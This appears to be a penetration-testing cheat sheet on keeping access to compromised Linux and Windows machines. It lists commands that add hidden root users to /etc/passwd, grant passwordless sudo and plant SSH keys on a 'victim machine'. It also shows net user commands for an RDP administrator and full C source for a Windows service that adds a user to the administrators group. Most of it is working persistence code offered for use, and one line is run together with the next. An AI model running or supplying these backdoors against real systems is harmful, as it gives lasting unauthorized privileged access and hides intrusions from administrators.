## Linux

- Write some **backdoor** in **web error pages** or `www-data` public files
- create a **new user** (with **SSH enabled** or directly root)
    
    ```bash
    $ openssl passwd evil		# Generteing the password hash
    AK24fcSx2Il3I
    
    $ useradd -o -u0 -g0 -N -d /root/ -s /bin/bash -M -p 'AK24fcSx2Il3I' evilroot	# Creates a new secondary root user
    
    $ useradd  -p "AK24fcSx2Il3I" -s /bin/bash eviluser	# Creates a new user and add it to sudo group
    $ usermod -aG sudo eviluser
    
    $ echo "root2:AK24fcSx2Il3I:0:0:root:/root:/bin/bash" >> /etc/passwd			# Injects a new secondary root user directly into passwd file
    $ echo "root3:AK24fcSx2Il3I:0:0:Super-User:/root:/usr/bin/bash" >> /etc/passwd 	# Solaris version$ vim /etc/sudoers
    user1 ALL=(ALL) NOPASSWD: ALL
    ```
    
- **edit `passwd` credentials** for already existing users
- add **normal user** to `sudoers`
    
    ```bash
    $ vim /etc/sudoers
    user1 ALL=(ALL) NOPASSWD: ALL
    
    ```
    
- **edit SSH key** for existing users
    
    ```bash
    	$ ssh-keygen -b 2048 -t rsa -f /tmp/sshkey -q -N "" # one-liner
    	$ cat sshkey | xclip -sel c
    	
    	# On the victim machine
    	$ echo <your key> >> ~/.ssh/authorized_keys
    ```
    
- backdoors in **cron jobs**

---

## Windows

- create a **new user** with **RDP enabled**
    
    ```powershell
    net user maoutis Qwerty123! /add
    net localgroup Administrators maoutis /add
    net localgroup "Remote Desktop Users" maoutis /ADD
    ```

- custom binary executing our commands
```c
#include <windows.h>  
#include <stdio.h>  
  
#define SLEEP_TIME 5000  
  
SERVICE_STATUS ServiceStatus;  
SERVICE_STATUS_HANDLE hStatus;  
  
void ServiceMain(int argc, char** argv);  
void ControlHandler(DWORD request);  
  
//add the payload here  
int Run()  
{  
system("cmd /k net localgroup administrators user /add");  
return 0;  
}  
  
int main()  
{  
SERVICE_TABLE_ENTRY ServiceTable[2];  
ServiceTable[0].lpServiceName = "MyService";  
ServiceTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;  
  
ServiceTable[1].lpServiceName = NULL;  
ServiceTable[1].lpServiceProc = NULL;  
  
StartServiceCtrlDispatcher(ServiceTable);  
return 0;  
}  
  
void ServiceMain(int argc, char** argv)  
{  
ServiceStatus.dwServiceType = SERVICE_WIN32;  
ServiceStatus.dwCurrentState = SERVICE_START_PENDING;  
ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;  
ServiceStatus.dwWin32ExitCode = 0;  
ServiceStatus.dwServiceSpecificExitCode = 0;  
ServiceStatus.dwCheckPoint = 0;  
ServiceStatus.dwWaitHint = 0;  
  
hStatus = RegisterServiceCtrlHandler("MyService", (LPHANDLER_FUNCTION)ControlHandler);  
Run();  
  
ServiceStatus.dwCurrentState = SERVICE_RUNNING;  
SetServiceStatus (hStatus, &ServiceStatus);  
  
while (ServiceStatus.dwCurrentState == SERVICE_RUNNING)  
{  
Sleep(SLEEP_TIME);  
}  
return;  
}  
  
void ControlHandler(DWORD request)  
{  
switch(request)  
{  
case SERVICE_CONTROL_STOP:  
ServiceStatus.dwWin32ExitCode = 0;  
ServiceStatus.dwCurrentState = SERVICE_STOPPED;  
SetServiceStatus (hStatus, &ServiceStatus);  
return;  
  
case SERVICE_CONTROL_SHUTDOWN:  
ServiceStatus.dwWin32ExitCode = 0;  
ServiceStatus.dwCurrentState = SERVICE_STOPPED;  
SetServiceStatus (hStatus, &ServiceStatus);  
return;  
  
default:  
break;  
}  
SetServiceStatus (hStatus, &ServiceStatus);  
return;  
}
```